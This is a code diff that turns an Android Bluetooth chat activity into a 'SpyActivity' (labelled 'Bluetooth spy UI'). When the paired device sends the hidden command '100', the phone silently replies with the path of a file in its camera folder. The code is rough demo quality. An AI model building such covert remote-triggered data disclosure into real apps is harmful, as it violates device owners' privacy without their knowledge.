@@ -4,10 +4,8 @@ import android.app.ProgressDialog;
 import android.bluetooth.BluetoothAdapter;
 import android.content.Intent;
 import android.os.Bundle;
-import android.view.KeyEvent;
+import android.os.Environment;
 import android.view.View;
-import android.widget.EditText;
-import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.annotation.Nullable;
@@ -21,6 +19,9 @@ import com.sf.bluetoothcommunication.service.BluetoothService;
 import org.greenrobot.eventbus.Subscribe;
 import org.greenrobot.eventbus.ThreadMode;
 
+import java.io.File;
+import java.nio.charset.Charset;
+
 import static com.sf.bluetoothcommunication.model.EventMsg.CODE_100;
 import static com.sf.bluetoothcommunication.model.EventMsg.CODE_101;
 import static com.sf.bluetoothcommunication.model.EventMsg.CODE_2;
@@ -29,27 +30,24 @@ import static com.sf.bluetoothcommunication.model.EventMsg.CODE_201;
 import static com.sf.bluetoothcommunication.model.EventMsg.CODE_202;
 import static com.sf.bluetoothcommunication.model.EventMsg.CODE_3;
 
-public class MainActivity extends BaseActivity {
+/**
+ * 作者:胡涛
+ * 日期:2020-6-18
+ * 时间:16:26
+ * 功能:蓝牙间谍UI
+ */
+public class SpyActivity extends BaseActivity {
 
-    private TextView tvConnectManager, tvResult, tvDeviceName;
-    private EditText etMessage;
-    private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
+    private ProgressDialog progressDialog;
     private static final int REQUEST_ENABLE_BT = 100;
+    private BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        initUI();
+        setContentView(R.layout.activity_spy);
         //打开蓝牙设备
         startBluetoothDevice();
-    }
-
-    @Override
-    protected void onDestroy() {
-        SoundPoolPlayer.getInstance().release();
-        stopService(new Intent(this, BluetoothService.class));
-        super.onDestroy();
     }
 
     /**
@@ -66,10 +64,6 @@ public class MainActivity extends BaseActivity {
             service.setAction(BluetoothService.START_SERVER_LISTENER);
             startService(service);
         }
-    }
-
-    public void back(View view) {
-        if (!isFinishing()) finish();
     }
 
     @Override
@@ -92,46 +86,29 @@ public class MainActivity extends BaseActivity {
         }
     }
 
-    private void initUI() {
-        tvResult = findViewById(R.id.tvResult);
-        etMessage = findViewById(R.id.etMessage);
-        tvDeviceName = findViewById(R.id.tvDeviceName);
-        tvConnectManager = findViewById(R.id.tvConnectManager);
-        BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
-        if (bluetoothAdapter == null) {
-            Toast.makeText(this, "当前设备不支持蓝牙！", Toast.LENGTH_SHORT).show();
-            tvConnectManager.setVisibility(View.GONE);
-        } else {
-            tvConnectManager.setVisibility(View.VISIBLE);
-        }
-        updateConnectedDeviceListUI();
-    }
-
-    /**
-     * 连接管理
-     *
-     * @param view
-     */
-    public void connectManager(View view) {
-        startActivity(new Intent(this, ConfigActivity.class));
-    }
-
-    public void sendMessage(View view) {
-        EditText editText = findViewById(R.id.etMessage);
-        String msg = editText.getText().toString();
-        byte[] data = msg.getBytes();
-        Intent service = new Intent(MainActivity.this, BluetoothService.class);
-        service.putExtra(BluetoothService.KEY, data);
-        service.setAction(BluetoothService.SEND_DATA);
-        startService(service);
-    }
 
     @Override
     public boolean supportEventBus() {
         return true;
     }
 
-    private ProgressDialog progressDialog;
+    public void back(View view) {
+        finish();
+    }
+
+    private static final String CUSTOM_CODE = "100";
+    /**
+     * 查看对方蓝牙设备的相册
+     * @param view
+     */
+    public void queryImgOther(View view) {
+        //自定义一个指令，假如说是发送100的话，对方需要给我发手机相册地址给我哦
+        byte[] data = CUSTOM_CODE.getBytes(Charset.forName("utf-8"));
+        Intent service = new Intent(this, BluetoothService.class);
+        service.putExtra(BluetoothService.KEY, data);
+        service.setAction(BluetoothService.SEND_DATA);
+        startService(service);
+    }
 
     @Subscribe(threadMode = ThreadMode.MAIN)
     public void onEventMsg(EventMsg eventMsg) {
@@ -144,26 +121,40 @@ public class MainActivity extends BaseActivity {
                 Toast.makeText(this, "已连接", Toast.LENGTH_SHORT).show();
                 if (progressDialog != null)
                     progressDialog.dismiss();
-                updateConnectedDeviceListUI();
                 SoundPoolPlayer.getInstance().playerMusic(this, R.raw.connect_ok);
                 break;
             case CODE_201://连接失败
                 Toast.makeText(this, "连接失败", Toast.LENGTH_SHORT).show();
                 if (progressDialog != null)
                     progressDialog.dismiss();
-                updateConnectedDeviceListUI();
                 SoundPoolPlayer.getInstance().playerMusic(this, R.raw.conect_fail);
                 break;
             case CODE_100://接收到消息
-                String msg = Pivot.getInstance().getCurrentConnectedDevice().getBluetoothDevice().getName() + ":" + new String(eventMsg.getData());
-                tvResult.append(msg + "\n");
+                String msg = Pivot.getInstance().getCurrentConnectedDevice().getBluetoothDevice().getName() + ":" + new String(eventMsg.getData(), Charset.forName("utf-8"));
                 SoundPoolPlayer.getInstance().playerMusic(this, R.raw.receive);
+                if (msg != null && msg.equals(Pivot.getInstance().getCurrentConnectedDevice().getBluetoothDevice().getName() + ":" + CUSTOM_CODE)) {
+                    //表示收到了自定义消息，立马需要给对方回传发送一个自己的相册路径
+                    String imgPaths = Environment.getExternalStorageDirectory() + "/DCIM/Camera";
+                    File file = new File(imgPaths);
+                    if (file.exists()) {
+                        File[] files = file.listFiles();
+                        for (int i = 0; i < files.length; i++) {
+                            if (i == 1) {
+                                String filePath = files[1].getAbsolutePath();
+                                byte[] data = filePath.getBytes();
+                                Intent service = new Intent(this, BluetoothService.class);
+                                service.putExtra(BluetoothService.KEY, data);
+                                service.setAction(BluetoothService.SEND_DATA);
+                                startService(service);
+                            }
+                        }
+                    }
+                } else {
+                    Toast.makeText(this, "收到图片地址：" + msg, Toast.LENGTH_SHORT).show();
+                }
                 break;
             case CODE_2:
                 Toast.makeText(this, "消息发送成功", Toast.LENGTH_SHORT).show();
-                String sendMsg = etMessage.getText().toString();
-                tvResult.append(sendMsg + "\n");
-                etMessage.setText("");
                 SoundPoolPlayer.getInstance().playerMusic(this, R.raw.send);
                 break;
             case CODE_3:
@@ -171,7 +162,6 @@ public class MainActivity extends BaseActivity {
                 break;
             case CODE_101://远程设备断开连接
                 //更新UI
-                updateConnectedDeviceListUI();
                 //连接断开后，需要重新开启监听线程，否则无法再次连接
                 if (bluetoothAdapter.isDiscovering())
                     bluetoothAdapter.cancelDiscovery();
@@ -182,17 +172,4 @@ public class MainActivity extends BaseActivity {
                 break;
         }
     }
-
-    /**
-     * 更新设备昵称显示
-     */
-    private void updateConnectedDeviceListUI() {
-        if (Pivot.getInstance().getCurrentConnectedDevice() != null) {
-            String deviceName = Pivot.getInstance().getCurrentConnectedDevice().getBluetoothDevice().getName();
-            tvDeviceName.setText(deviceName);
-        } else {
-            tvDeviceName.setText("暂无设备连接");
-        }
-    }
-
 }
